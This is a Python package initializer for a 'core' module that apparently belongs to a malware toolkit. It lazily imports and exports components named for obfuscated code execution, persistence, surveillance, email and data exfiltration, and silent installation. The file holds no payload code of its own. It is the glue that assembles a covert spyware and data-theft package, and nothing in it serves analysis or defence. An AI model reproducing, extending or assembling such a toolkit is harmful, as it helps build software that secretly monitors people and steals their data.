# Core module initialization
# This file makes the 'core' directory a Python package

# Use lazy imports to avoid circular dependency issues
def _import_crypto_utils():
    try:
        from .crypto_utils import StringObfuscator, obfuscate_string, deobfuscate_string, execute_obfuscated_code
        return StringObfuscator, obfuscate_string, deobfuscate_string, execute_obfuscated_code
    except ImportError:
        return None, None, None, None

def _import_persistence():
    try:
        from .persistence import PersistenceManager
        return PersistenceManager
    except ImportError:
        return None

def _import_surveillance():
    try:
        from .surveillance import SurveillanceEngine
        return SurveillanceEngine
    except ImportError:
        return None

def _import_communication():
    try:
        from .communication import EmailExfiltrator, DataExfiltrator
        return EmailExfiltrator, DataExfiltrator
    except ImportError:
        return None, None

def _import_auto_installer():
    try:
        from .auto_installer import SilentInstaller
        return SilentInstaller
    except ImportError:
        return None

def _import_enhanced_installer():
    try:
        from .enhanced_installer import EnhancedInstaller
        return EnhancedInstaller
    except ImportError:
        return None

# Export functions that handle missing dependencies gracefully
def get_crypto_utils():
    return _import_crypto_utils()

def get_persistence():
    return _import_persistence()

def get_surveillance():
    return _import_surveillance()

def get_communication():
    return _import_communication()

def get_auto_installer():
    return _import_auto_installer()

def get_enhanced_installer():
    return _import_enhanced_installer()

# For backward compatibility, try to import directly but don't fail if missing
try:
    StringObfuscator, obfuscate_string, deobfuscate_string, execute_obfuscated_code = _import_crypto_utils()
    PersistenceManager = _import_persistence()
    SurveillanceEngine = _import_surveillance()
    EmailExfiltrator, DataExfiltrator = _import_communication()
    SilentInstaller = _import_auto_installer()
    EnhancedInstaller = _import_enhanced_installer()
except Exception:
    # If any import fails, set to None
    StringObfuscator = obfuscate_string = deobfuscate_string = execute_obfuscated_code = None
    PersistenceManager = None
    SurveillanceEngine = None
    EmailExfiltrator = DataExfiltrator = None
    SilentInstaller = None
    EnhancedInstaller = None

__all__ = [
    'StringObfuscator',
    'obfuscate_string', 
    'deobfuscate_string',
    'execute_obfuscated_code',
    'PersistenceManager',
    'SurveillanceEngine',
    'EmailExfiltrator',
    'DataExfiltrator',
    'SilentInstaller',
    'EnhancedInstaller',
    'get_crypto_utils',
    'get_persistence',
    'get_surveillance',
    'get_communication',
    'get_auto_installer',
    'get_enhanced_installer'
] 